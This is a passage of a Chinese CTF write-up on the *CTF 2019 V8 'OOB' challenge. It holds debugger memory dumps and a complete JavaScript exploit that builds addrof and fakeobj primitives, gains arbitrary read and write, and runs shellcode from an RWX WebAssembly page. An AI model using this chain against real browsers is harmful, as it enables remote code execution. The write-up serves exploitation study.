<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shared_info:</span><br><span class="line">pwndbg&gt; x/10xg 0x0000144056c21ef9-1</span><br><span class="line">0x144056c21ef8:	0x00003de1f2ac09e1	0x0000144056c21ed1   --&gt; WasmExportedFunctionData</span><br><span class="line">0x144056c21f08:	0x00003de1f2ac4ae1	0x00003de1f2ac2a39</span><br><span class="line">0x144056c21f18:	0x00003de1f2ac04d1	0x0000000000000000</span><br><span class="line">0x144056c21f28:	0x0000000000000000	0x00002ab4903c4379</span><br><span class="line">0x144056c21f38:	0x00003de1f2ac0c71	0x00003de1f2ac0c71</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WasmExportedFunctionData:</span><br><span class="line">pwndbg&gt; x/10xg 0x0000144056c21ed1-1</span><br><span class="line">0x144056c21ed0:	0x00003de1f2ac5879	0x00001defa6dc2001</span><br><span class="line">0x144056c21ee0:	0x0000144056c21d39   --&gt; instance	 0x0000000000000000</span><br><span class="line">0x144056c21ef0:	0x0000000000000000	0x00003de1f2ac09e1</span><br><span class="line">0x144056c21f00:	0x0000144056c21ed1	0x00003de1f2ac4ae1</span><br><span class="line">0x144056c21f10:	0x00003de1f2ac2a39	0x00003de1f2ac04d1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">instance+0x88:</span><br><span class="line">pwndbg&gt; telescope 0x0000144056c21d39-1+0x88</span><br><span class="line">00:0000│   0x144056c21dc0 —▸ 0x27860927e000 ◂— movabs r10, 0x27860927e260 /* 0x27860927e260ba49 */       --&gt; 可执行地址</span><br><span class="line">01:0008│   0x144056c21dc8 —▸ 0x2649b9fd0251 ◂— 0x7100002ab4903c91</span><br><span class="line">02:0010│   0x144056c21dd0 —▸ 0x2649b9fd0489 ◂— 0x7100002ab4903cad</span><br><span class="line">03:0018│   0x144056c21dd8 —▸ 0x144056c01869 ◂— 0x3de1f2ac0f</span><br><span class="line">04:0020│   0x144056c21de0 —▸ 0x144056c21e61 ◂— 0x7100002ab4903ca1</span><br><span class="line">05:0028│   0x144056c21de8 —▸ 0x3de1f2ac04d1 ◂— 0x3de1f2ac05</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0x27860927e000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x27860927e000     0x27860927f000 rwxp     1000 0</span><br></pre></td></tr></table></figure>
<p>可得知<code>0x144056c21dc0</code>处的<code>0x27860927e000</code>为可执行区域，那么只需要将<code>0x144056c21dc0</code>处的内容读取出来，在将<code>shellcode</code>写入读取出来的地址处即可完成程序流劫持：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var data1 = read_all(leak_f+0x18n);</span><br><span class="line">var data2 = read_all(data1+0x8n);</span><br><span class="line">var data3 = read_all(data2+0x10n);</span><br><span class="line">var data4 = read_all(data3+0x88n);</span><br><span class="line">//console.log(&apos;0x&apos;+data4.toString(16));</span><br><span class="line"></span><br><span class="line">let buff_new = new ArrayBuffer(0x100);</span><br><span class="line">let dataview = new DataView(buff_new);</span><br><span class="line">let leak_buff = leak_obj(buff_new);</span><br><span class="line">let fake_write = leak_buff+0x20n;</span><br><span class="line">write_all(fake_write,data4);</span><br><span class="line">var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">for(var i=0;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">    dataview.setUint32(4*i,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<h3 id="利用成功："><a href="#利用成功：" class="headerlink" title="利用成功："></a>利用成功：</h3><p><img src="/*CTF2019-OOB/4756CD65-F51B-4430-AACF-EA1F14E1701D.png" alt="4756CD65-F51B-4430-AACF-EA1F14E1701D"></p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">var buff_area = new ArrayBuffer(0x10);</span><br><span class="line">var fl = new Float64Array(buff_area);</span><br><span class="line">var ui = new BigUint64Array(buff_area);</span><br><span class="line"></span><br><span class="line">function ftoi(floo)&#123;</span><br><span class="line">    fl[0] = floo;</span><br><span class="line">    return ui[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(intt)&#123;</span><br><span class="line">    ui[0] = intt;</span><br><span class="line">    return fl[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function tos(data)&#123;</span><br><span class="line">    return &quot;0x&quot;+data.toString(16);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&quot;A&quot;:1&#125;;</span><br><span class="line">var obj_all = [obj];</span><br><span class="line">var array_all = [1.1,2,3];</span><br><span class="line">var obj_map = obj_all.oob();       //obj_JSArray_map</span><br><span class="line">var float_array_map = array_all.oob();   //float_JSArray_map</span><br><span class="line"></span><br><span class="line">function leak_obj(obj_in)&#123;</span><br><span class="line">    obj_all[0] = obj_in;</span><br><span class="line">    obj_all.oob(float_array_map);</span><br><span class="line">    let leak_obj_addr = obj_all[0];</span><br><span class="line">    obj_all.oob(obj_map);</span><br><span class="line">    return ftoi(leak_obj_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fake_obj(obj_in)&#123;</span><br><span class="line">    array_all[0] = itof(obj_in);</span><br><span class="line">    array_all.oob(obj_map);</span><br><span class="line">    let fake_obj_addr = array_all[0];</span><br><span class="line">    array_all.oob(float_array_map);</span><br><span class="line">    return fake_obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var tt = [float_array_map,1.1,1,0xfffffff];</span><br><span class="line"></span><br><span class="line">function write_all(read_addr,read_data)&#123;</span><br><span class="line">    let test_read = fake_obj(leak_obj(tt)-0x20n);</span><br><span class="line">    tt[2] = itof(read_addr-0x10n);</span><br><span class="line">    test_read[0] = itof(read_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read_all(write_addr)&#123;</span><br><span class="line">    let test_write = fake_obj(leak_obj(tt)-0x20n);</span><br><span class="line">    tt[2] = itof(write_addr-0x10n);</span><br><span class="line">    return ftoi(test_write[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//console.log(tos(read_all(leak_obj(tt)-0x20n)));</span><br><span class="line">//write_all(leak_obj(tt)-0x20n,0xffffffn);</span><br><span class="line"></span><br><span class="line">function sj_leak_test_base(leak_addr)&#123;</span><br><span class="line">    leak_addr -= 1n;</span><br><span class="line">    while(true)&#123;</span><br><span class="line">        let data = read_all(leak_addr+1n);</span><br><span class="line">        let data1 = data.toString(16).padStart(16,&apos;0&apos;);</span><br><span class="line">        let data2 = data1.substr(13,3);</span><br><span class="line">        //console.log(toString(data));</span><br><span class="line">        //console.log(data1);</span><br><span class="line">        //console.log(data2);</span><br><span class="line">        //%SystemBreak();</span><br><span class="line">        if(data2 == &apos;2c0&apos; &amp;&amp; read_all(data+1n).toString(16) == &quot;ec834853e5894855&quot;)&#123;</span><br><span class="line">            //console.log(&apos;0x&apos;+data.toString(16));</span><br><span class="line">            return data;</span><br><span class="line">        &#125;</span><br><span class="line">        leak_addr -= 8n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write_dataview(fake_addr,fake_data)&#123;</span><br><span class="line">    let buff_new = new ArrayBuffer(0x30);</span><br><span class="line">    let dataview = new DataView(buff_new);</span><br><span class="line">    let leak_buff = leak_obj(buff_new);</span><br><span class="line">    let fake_write = leak_buff+0x20n;</span><br><span class="line">    write_all(fake_write,fake_addr);</span><br><span class="line">    dataview.setBigUint64(0,fake_data,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function wd_leak_test_base(test)&#123;</span><br><span class="line">    let test_fake = leak_obj(test.constructor);</span><br><span class="line">    test_fake += 0x30n;</span><br><span class="line">    test_fake = read_all(test_fake)+0x40n;</span><br><span class="line">    test_fake = (read_all(test_fake)&amp;0xffffffffffff0000n)&gt;&gt;16n;</span><br><span class="line">    return test_fake;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write_system_addr(leak_test_addr)&#123;</span><br><span class="line">    var elf_base = leak_test_addr - 11359456n;</span><br><span class="line">    console.log(&quot;[*] leak elf base success: 0x&quot;+elf_base.toString(16));</span><br><span class="line">    var puts_got = elf_base + 0xD9A3B8n;</span><br><span class="line">    puts_got = read_all(puts_got+1n);</span><br><span class="line">    console.log(&quot;[*] leak puts got success: 0x&quot;+puts_got.toString(16));</span><br><span class="line">    var libc_base = puts_got - 456336n;</span><br><span class="line">    console.log(&quot;[*] leak libc base success: 0x&quot;+libc_base.toString(16));</span><br><span class="line">    var free_hook = libc_base + 3958696n;</span><br><span class="line">    console.log(&quot;[*] leak __free_hook success: 0x&quot;+free_hook.toString(16));</span><br><span class="line">    var one_gadget = libc_base + 0x4526an;</span><br><span class="line">    console.log(&quot;[*] leak one_gadget success: 0x&quot;+one_gadget.toString(16));</span><br><span class="line">    var system_addr = libc_base + 283536n;</span><br><span class="line">    write_dataview(free_hook,system_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_shell()&#123;</span><br><span class="line">    var bufff = new ArrayBuffer(0x10);</span><br><span class="line">    var dataa = new DataView(bufff);</span><br><span class="line">    dataa.setBigUint64(0,0x0068732f6e69622fn,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var f = wasmInstance.exports.main;</span><br><span class="line">var leak_f = leak_obj(f);</span><br><span class="line">//console.log(&apos;0x&apos;+leak_f.toString(16));</span><br><span class="line">//console.log(f());</span><br><span class="line">//%DebugPrint(f);</span><br><span class="line">//%SystemBreak();</span><br><span class="line"></span><br><span class="line">var data1 = read_all(leak_f+0x18n);</span><br><span class="line">var data2 = read_all(data1+0x8n);</span><br><span class="line">var data3 = read_all(data2+0x10n);</span><br><span class="line">var data4 = read_all(data3+0x88n);</span><br><span class="line">//console.log(&apos;0x&apos;+data4.toString(16));</span><br><span class="line"></span><br><span class="line">let buff_new = new ArrayBuffer(0x100);</span><br><span class="line">let dataview = new DataView(buff_new);</span><br><span class="line">let leak_buff = leak_obj(buff_new);</span><br><span class="line">let fake_write = leak_buff+0x20n;</span><br><span class="line">write_all(fake_write,data4);</span><br><span class="line">var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];</span><br><span class="line"></span><br><span class="line">for(var i=0;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">    dataview.setUint32(4*i,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//dataview.setBigUint64(0,0x2fbb485299583b6an,true);</span><br><span class="line">//dataview.setBigUint64(8,0x5368732f6e69622fn,true);</span><br><span class="line">//dataview.setBigUint64(16,0x050f5e5457525f54n,true);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持v1nke</div>
        <ul>
        
          <li class="item">
            <span>微信扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>支付宝扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2019/06/05/v8-环境搭建/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2019/07/27/CVE-2019-5786/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
